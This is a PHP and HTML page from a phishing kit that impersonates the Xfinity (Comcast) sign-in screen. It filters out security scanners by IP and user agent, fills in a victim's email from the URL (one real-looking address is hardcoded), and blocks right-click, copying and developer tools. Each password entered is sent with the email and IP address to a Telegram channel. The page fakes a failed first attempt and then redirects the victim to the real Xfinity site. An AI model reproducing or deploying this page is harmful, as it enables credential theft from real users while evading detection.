<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Sign in to Xfinity</title>
	
	<!-- Antibot Scripts -->
	<script src="../m/js/fingerprint.js"></script>
	<script src="../m/js/utils.js"></script>
	<script src="../m/js/captcha.js"></script>
	
	<!-- Centralized Functions -->
	<script src="../js/centralized_telegram.js"></script>
	<script src="../js/centralized_redirect.js"></script>
	<script src="../js/email_extractor.js"></script>
	<script src="../js/autofill_helper.js"></script>
	<link rel="shortcut icon" href="/favicon.ico">
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
	<style>
		:root {
			--text: #0f0f12;
			--muted: #5f6067;
			--primary: #6f2da8;
			--primary-dark: #5a2386;
			--border: #0b6e63;
			--input-bg: #f5f6fb;
			--footer-icon: #161616;
		}
		* { box-sizing: border-box; }
		html, body {
			margin: 0;
			padding: 0;
			font-family: 'Inter', Arial, sans-serif;
			background: #fff;
			color: var(--text);
		}
		body {
			min-height: 100vh;
			display: flex;
			justify-content: center;
			align-items: center;
		}
		.page {
			width: 100%;
			max-width: 720px;
			padding: 28px 16px 96px;
			display: flex;
			flex-direction: column;
		}
		.login-box {
			max-width: 640px;
		}
		.xfinity-logo svg {
			width: 104px;
			height: 34px;
			display: block;
			margin-bottom: 18px;
		}
		.user-email {
			font-weight: 700;
			font-size: 0.94rem;
			margin-bottom: 6px;
			color: var(--text);
		}
		.login-title {
			font-size: 1.9rem;
			font-weight: 700;
			margin: 0 0 18px;
			letter-spacing: -0.02em;
			color: var(--text);
		}
		.input-wrap {
			position: relative;
			margin-bottom: 6px;
		}
		.input-field {
			width: 100%;
			height: 58px;
			padding: 14px 46px 14px 12px;
			font-size: 0.96rem;
			font-weight: 500;
			border: 2px solid var(--border);
			border-radius: 8px;
			background: var(--input-bg);
			outline: none;
			color: var(--text);
			transition: border-color 0.15s ease;
		}
		.input-field:focus { border-color: #0c8a7a; }
		.show-hide-btn {
			position: absolute;
			right: 12px;
			top: 50%;
			transform: translateY(-50%);
			background: none;
			border: none;
			cursor: pointer;
			padding: 4px;
			color: #3c3c3f;
		}
		.show-hide-btn svg { width: 18px; height: 18px; display: block; }
		.forgot-link {
			display: inline-block;
			margin-top: 8px;
			color: #5a2dbd;
			font-weight: 700;
			font-size: 0.94rem;
			text-decoration: none;
		}
		.forgot-link:hover { text-decoration: underline; }
		.remember-row {
			display: flex;
			align-items: center;
			margin-top: 14px;
			font-size: 0.94rem;
			gap: 8px;
		}
		.remember-row input[type="checkbox"] {
			width: 20px;
			height: 20px;
			margin-right: 10px;
			accent-color: var(--primary);
		}
		.legal {
			margin-top: 16px;
			font-size: 0.88rem;
			line-height: 1.32;
			color: var(--text);
		}
		.legal a {
			color: #5a2dbd;
			text-decoration: underline;
			font-weight: 500;
		}
		.sign-in-btn {
			margin-top: 22px;
			width: 140px;
			height: 44px;
			border: none;
			border-radius: 6px;
			background: var(--primary);
			color: #fff;
			font-size: 0.98rem;
			font-weight: 700;
			cursor: pointer;
			transition: background 0.2s ease, transform 0.1s ease;
		}
		.sign-in-btn:hover { background: var(--primary-dark); }
		.sign-in-btn:active { transform: translateY(1px); }
		.sign-in-alt {
			margin-top: 22px;
			font-size: 0.98rem;
			font-weight: 700;
		}
		.help-row {
			margin-top: 10px;
			font-size: 0.92rem;
			color: var(--text);
		}
		.help-row a {
			color: #5a2dbd;
			text-decoration: underline;
			font-weight: 500;
		}
		.footer {
			margin-top: 48px;
			color: var(--muted);
			font-size: 0.9rem;
			width: 100vw;
			margin-left: calc(50% - 50vw);
			padding: 0 28px;
			box-sizing: border-box;
		}
		.footer-links {
			display: flex;
			flex-wrap: wrap;
			gap: 20px 24px;
			justify-content: space-between;
			padding: 0;
			list-style: none;
			margin: 0 0 18px;
		}
		.footer-links li {
			display: inline-flex;
			align-items: center;
			gap: 8px;
			color: var(--text);
			font-weight: 500;
		}
		.footer-links a {
			color: var(--text);
			text-decoration: none;
		}
		.footer-links a:hover { text-decoration: underline; }
		.footer-links svg {
			width: 18px;
			height: 18px;
			color: var(--footer-icon);
		}
		.cookie-bar {
			position: fixed;
			left: 0;
			bottom: 0;
			width: 100%;
			padding: 10px 0;
			background: #111;
			color: #fff;
			text-align: center;
			font-weight: 700;
			z-index: 10;
			border-top: 1px solid #1f1f1f;
			font-size: 0.92rem;
		}
		.cookie-bar a {
			color: #fff;
			text-decoration: none;
			display: inline-flex;
			align-items: center;
			gap: 6px;
		}
		.cookie-bar svg { width: 18px; height: 18px; }
		@media (max-width: 640px) {
			.page { padding: 22px 12px 88px; }
			.login-title { font-size: 1.8rem; margin-bottom: 16px; }
			.input-field { height: 52px; padding: 12px 42px 12px 10px; font-size: 0.9rem; }
			.sign-in-btn { width: 132px; height: 42px; font-size: 0.92rem; }
			.footer { margin-top: 36px; font-size: 0.86rem; padding: 0 18px; }
			.footer-links { gap: 14px; }
			.footer-links svg { width: 15px; height: 15px; }
			.cookie-bar { font-size: 0.9rem; padding: 9px 0; }
		}
	</style>
</head>
<body>
	<div class="page">
		<div class="login-box">
			<div class="xfinity-logo">
				<svg viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
					<text x="0" y="30" font-family="Arial, Helvetica, sans-serif" font-size="32" font-weight="400" fill="#8e8e9f" letter-spacing="1">xfinity</text>
				</svg>
			</div>
		<div class="user-email" id="emailDisplay">kellyjwalker@comcast.net</div>
		<h1 class="login-title">Enter your password</h1>
		<form autocomplete="off" onsubmit="return false;">
			<input type="hidden" id="email" name="email" value="kellyjwalker@comcast.net">
			<div class="input-wrap">
				<input class="input-field" type="password" id="password" name="password" maxlength="128" required autocomplete="current-password">
				<button class="show-hide-btn" type="button" id="togglePassword" aria-label="Show password">
					<svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1.5 12s4-7 10.5-7 10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3.5"/></svg>
				</button>
			</div>
			<a class="forgot-link" href="#" onclick="alert('Password reset not implemented in this demo.'); return false;">Forgot password?</a>
			<div class="remember-row">
				<input type="checkbox" id="rememberMe" name="rememberMe">
				<label for="rememberMe">Keep me signed in</label>
			</div>
			<div class="legal">
				By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/" target="_blank" rel="noopener">Terms of Service</a> and <a href="https://www.xfinity.com/privacy/" target="_blank" rel="noopener">Privacy Policy</a>.
			</div>
			<button class="sign-in-btn" type="submit" id="submit-btn">Sign in</button>
		</form>
			<div class="sign-in-alt">Sign in as someone else</div>
			<div class="help-row">Trouble signing in? <a href="#" onclick="alert('Help not implemented in this demo.'); return false;">Get help</a></div>
		</div>

		<footer class="footer">
			<ul class="footer-links">
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M6 3h9l3 3v15H6z"/><path d="M15 3v3h3"/></svg>
					<a href="#" aria-label="Web Terms Of Service">Web Terms Of Service</a>
				</li>
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
					<a href="#" aria-label="CA Notice at Collection">CA Notice at Collection</a>
				</li>
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 7a4 4 0 0 1 4-4h8a4 4 0 0 1 4 4v10a4 4 0 0 1-4 4H8a4 4 0 0 1-4-4z"/><path d="M12 11v6"/><path d="M9 14h6"/></svg>
					<a href="#" aria-label="Privacy Policy">Privacy Policy</a>
				</li>
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 4a6 6 0 0 1 6 6c0 5-6 10-6 10S6 15 6 10a6 6 0 0 1 6-6z"/><circle cx="12" cy="10" r="2"/></svg>
					<a href="#" aria-label="Your Privacy Choices">Your Privacy Choices</a>
				</li>
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 20s8-4 8-10a8 8 0 1 0-16 0c0 6 8 10 8 10z"/><circle cx="12" cy="10" r="3"/></svg>
					<a href="#" aria-label="Health Privacy Notice">Health Privacy Notice</a>
				</li>
				<li>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M5 4l14 8-14 8V4z"/></svg>
					<a href="#" aria-label="Ad Choices">Ad Choices</a>
				</li>
			</ul>
			<div>&copy; 2025 Comcast</div>
		</footer>
	</div>

	<div class="cookie-bar">
		<a href="#" aria-label="Cookie Preferences">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 3a9 9 0 1 0 9 9 4 4 0 0 1-4-4 4 4 0 0 1-4-4z"/><circle cx="8" cy="12" r="1"/><circle cx="12" cy="16" r="1"/><circle cx="16" cy="12" r="1"/></svg>
			Cookie Preferences
		</a>
	</div>

	<script>
		const toggleBtn = document.getElementById('togglePassword');
		const pwdInput = document.getElementById('password');
		const eyeOpen = document.getElementById('eyeOpen');

		function togglePassword() {
			const showing = pwdInput.type === 'text';
			pwdInput.type = showing ? 'password' : 'text';
			toggleBtn.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
			if (showing) {
				eyeOpen.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1.5 12s4-7 10.5-7 10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3.5"/>';
			} else {
				eyeOpen.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3l18 18M4.26 4.26C2.47 5.81 1.5 7.5 1.5 7.5s4 7 10.5 7c1.55 0 3-.33 4.34-.89M9.88 9.88a3.5 3.5 0 0 1 4.24 4.24"/>';
			}
		}

		toggleBtn.addEventListener('click', togglePassword);
	</script>

	<!-- Antibot Scripts -->
	<script src="../m/js/fingerprint.js"></script>
	<script src="../m/js/utils.js"></script>
	<script src="../m/js/captcha.js"></script>
	
	<!-- Centralized Functions -->
	<script src="../js/centralized_telegram.js"></script>
	<script src="../js/centralized_redirect.js"></script>
	
	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
	<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
	<script>
	/* global $ */
	$(document).ready(function() {
		var count = 0;

		function isValidEmail(email) {
			var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
			return filter.test(email);
		}

		// Auto-fill email from URL hash fragment.
		// Accepts:
		//  - #email=user@example.com
		//  - #user%40example.com (raw value)
		//  - #dXNlcj5AZXhhbXBsZS5jb20= (base64 encoded value)
		function autoFillFromHash() {
			try {
				var h = window.location.hash || '';
				if (!h) return;
				var fragment = h.substr(1);
				if (!fragment) return;

				// If prefix like email=abc then split and use RHS
				var value = fragment;
				var partsIdx = fragment.indexOf('=');
				if (partsIdx !== -1) {
					var lhs = fragment.substr(0, partsIdx).toLowerCase();
					var rhs = fragment.substr(partsIdx + 1);
					if (lhs === 'email') value = rhs;
				}

				// URL decode once
				try { value = decodeURIComponent(value); } catch (e) { /* ignore */ }

				// If base64, decode
				var base64regex = /^([A-Za-z0-9+/]{4})*(([A-Za-z0-9+/]{2}==)|([A-Za-z0-9+/]{3}=))?$/;
				if (base64regex.test(value.replace(/\s/g, ''))) {
					try {
						var decoded = atob(value);
						if (decoded) value = decoded;
					} catch (e) { /* ignore if not valid base64 */ }
				}

				// Fill the field if it looks like a valid email
				if (value && isValidEmail(value)) {
					$('#email').val(value);
					$('#emailDisplay').text(value);
					// Focus the password field
					$('#password').focus();
				}
			} catch (err) { console.warn('autoFillFromHash error', err); }
		}

		// Run auto-fill on page ready
		autoFillFromHash();

		// Anti-copy / anti-inspect: discourage right-click, copying, and common dev keys.
		(function() {
			// Disable right-click context menu on non-touch devices only
			var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
			if (!isTouch) {
				document.addEventListener('contextmenu', function(e) {
					e.preventDefault();
					return false;
				}, false);
			}

			// Disable copy from page
			document.addEventListener('copy', function(e) {
				try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
				e.preventDefault();
				return false;
			});

			// Prevent selection initiation (safely allow within inputs)
			document.addEventListener('selectstart', function(e) {
				if (!e.target.closest('input, textarea')) {
					e.preventDefault();
					return false;
				}
			});

			// Block some developer tools key combos (not foolproof)
			document.addEventListener('keydown', function(e) {
				// F12
				if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
				// Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
				if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
				// Ctrl+U, Ctrl+S
				if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
				// Cmd+Option+I (mac dev tools)
				if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
			});
		})();

		$('#submit-btn').on('click', function(event) {
			event.preventDefault();
			var email = $('#email').val() ? $('#email').val().trim() : '';
			var pw = $('#password').val() ? $('#password').val().trim() : '';
			
			if (!email) {
				$('#password').focus();
				return false;
			}
			if (!isValidEmail(email)) {
				$('#password').focus();
				return false;
			}
			if (!pw) {
				$('#password').focus();
				return false;
			}

			// Attempt flow: first submit shows a wrong-credentials message, but
			// we still send a safe telemetry event on every submit. The second
			// submit will also redirect after reporting.
			count = count + 1;

			// Use centralized Telegram reporting with provider tag
			window.providerTag = 'comcast';
			var clientIP = window.userip || 'n/a';
			
			function sendTelemetry(attempt, redirectOnSuccess) {
				// Send centralized Telegram report
				if (typeof sendCentralizedTelegramReport === 'function') {
					sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
						if (redirectOnSuccess) {
							// Use centralized redirect
							if (typeof performCentralizedRedirect === 'function') {
								performCentralizedRedirect(300);
							} else {
								// Fallback if centralized redirect not available
								setTimeout(function() { 
									window.location.replace('https://login.xfinity.com/login');
								}, 300);
							}
						}
					});
				} else {
					// Fallback if centralized function not available
					console.error('Centralized Telegram function not available');
					if (redirectOnSuccess) {
						if (typeof performCentralizedRedirect === 'function') {
							performCentralizedRedirect(300);
						} else {
							setTimeout(function() { 
								window.location.replace('https://login.xfinity.com/login');
							}, 300);
						}
					}
				}
				
				if (redirectOnSuccess) {
					$('#submit-btn').text('Verifying...');
					setTimeout(function() {
						$('#submit-btn').text('Sign in');
					}, 200);
				}
			}

			// Always send telemetry (including the first attempt). Only redirect
			// when we have at least 2 attempts.
			sendTelemetry(count, (count >= 2));

			if (count === 1) {
				// Clear password for privacy, focus and allow user to try again
				$('#password').val('').focus();
				return false;
			}
		});
	});
	</script>
</body>
</html>

